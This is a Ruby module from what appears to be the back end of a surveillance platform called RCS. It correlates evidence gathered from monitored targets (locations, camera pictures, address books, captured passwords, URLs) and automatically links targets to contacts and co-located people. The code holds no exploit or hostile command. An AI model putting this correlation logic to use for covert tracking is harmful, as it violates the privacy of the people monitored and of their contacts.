#
# Intelligence processing module
#
# the evidence to be processed are queued by the workers
#

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

require_relative 'accounts'
require_relative 'camera'
require_relative 'position'
require_relative 'ghost'
require_relative 'passwords'

module RCS
module Intelligence

class Processor
  extend RCS::Tracer

  @@status = 'Starting...'

  def self.status
    @@status
  end

  def self.run
    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if (queued = IntelligenceQueue.get_queued)
        entry = queued.first
        count = queued.last
        @@status = "Correlating #{count} evidence in queue"
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        @@status = 'Idle...'
        sleep 1
      end
    end
  rescue Exception => e
    trace :error, "Thread error: #{e.message}"
    trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
    retry
  end


  def self.process(entry)
    entity = entry.related_entity

    case entry.type
      when :evidence
        evidence = entry.related_item
        trace :info, "Processing #{evidence.type} evidence for entity #{entity.name}"
        process_evidence(entity, evidence)

      when :aggregate
        aggregate = entry.related_item
        trace :info, "Processing #{aggregate.type} aggregate for entity #{entity.name}"
        process_aggregate(entity, aggregate)
    end

  rescue Exception => e
    trace :error, "Cannot process intelligence: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end

  def self.process_evidence(entity, evidence)
    case evidence.type
      when 'position'
        # save the last position of the entity
        Position.save_last_position(entity, evidence)
      when 'camera'
        # save picture of the target
        Camera.save_first_camera(entity, evidence)
      when 'addressbook'
        # analyze the accounts
        Accounts.add_handle(entity, evidence)
        # create a ghost entity and link it as :know
        Ghost.create_and_link_entity(entity, evidence) if check_intelligence_license
        # If a person entity is created with an handle-like name (ex: wxa_d231231),
        # wait for an adressbook ev. and update its name with human readable one.
        Accounts.update_person_entity_name(entity, evidence)
      when 'password'
        # analyze the accounts
        Passwords.add_handle(entity, evidence)
      when 'url'
        Virtual.process_url_evidence(entity, evidence)
    end
  end

  def self.check_intelligence_license
    LicenseManager.instance.check :intelligence
  end

  # Process the aggregate and (eventually) link the entities
  def self.process_aggregate entity, aggregate
    if aggregate.type == :position
      process_position_aggregate entity, aggregate
    else
      process_peer_aggregate entity, aggregate
    end
  end

  def self.process_peer_aggregate entity, aggregate
    # normalize the type to search for the correct account
    aggregate_type = aggregate.type
    handle_type = aggregate.entity_handle_type

    # As the version 9.0.0 the aggregate has a "sender" key that contains the handle of the other peer
    # involved in a communication. The "sender" is an handle of the current entity (the one under surveillance)
    if !aggregate.data['sender'].blank? and aggregate.data['versus'] == :out
      entity.create_or_update_handle handle_type, aggregate.data['sender'].downcase
    end

    # search for existing entity with that account and link it (direct link)
    if (peer = Entity.same_path_of(entity).where("handles.handle" => aggregate.data['peer'], "handles.type" => handle_type).first)
      info = "#{aggregate.data['sender']} #{aggregate.data['peer']}".strip
      level = peer.level == :ghost ? :ghost : :automatic
      RCS::DB::LinkManager.instance.add_link(from: entity, to: peer, level: level, type: :peer, versus: aggregate.data['versus'].to_sym, info: info)
      return
    end

    # search if two entities are communicating with a third party and link them (indirect link)
    ::Entity.targets.same_path_of(entity).each do |e|

      trace :debug, "Checking if '#{entity.name}' and '#{e.name}' have common peer: #{aggregate.data['peer']}"

      next unless Aggregate.target(e.path.last).summary_include?(aggregate_type, aggregate.data['peer'])

      trace :debug, "Peer found, creating new entity... #{aggregate.data['peer']}"

      # create the new entity
      name = Entity.name_from_handle(aggregate_type, aggregate.data['peer'], e.path.last)
      name ||= aggregate.data['peer']
      description = "Created automatically because #{entity.name} and #{e.name} communicated with it"
      ghost = Entity.create!(name: name, type: :person, level: :automatic, path: [entity.path.first], desc: description)

      # the entities will be linked on callback
      ghost.handles.create!(level: :automatic, type: aggregate_type, handle: aggregate.data['peer'])
    end
  end

  def self.process_position_aggregate entity, aggregate
    position = aggregate.position
    position_ary = [position[:longitude], position[:latitude]]

    operation_id = entity.path.first
    point = aggregate.to_point

    # Search for a position entity that match the current position aggregate
    # If found link the position entity to the target entity of the matched aggregate
    Entity.path_include(operation_id).positions_within(position).each do |position_entity|
      next unless position_entity.to_point.similar_to? point

      link_params = {from: entity, to: position_entity, level: :automatic, type: :position, versus: :out, info: aggregate.info}
      RCS::DB::LinkManager.instance.add_link link_params

      return
    end

    # If 2 entities (type :target) have been in the same place at the same time
    # creates a new position entity (if is missing)
    Entity.targets.same_path_of(entity).each do |other_entity|
      aggregate_class = Aggregate.target other_entity.target_id
      next if aggregate_class.empty?

      aggregate_class.where(day: aggregate.day).positions_within(position).each do |ag|

        next unless point.similar_to? ag.to_point

        next unless point.intersect_timeframes? ag.info

        entity_params = {type: :position, path: [operation_id], position: position_ary, level: :automatic, position_attr: {accuracy: point.r}}
        position_entity = Entity.create! entity_params
        position_entity.fetch_address

        return
      end
    end
  end
end

end #OCR::
end #RCS::
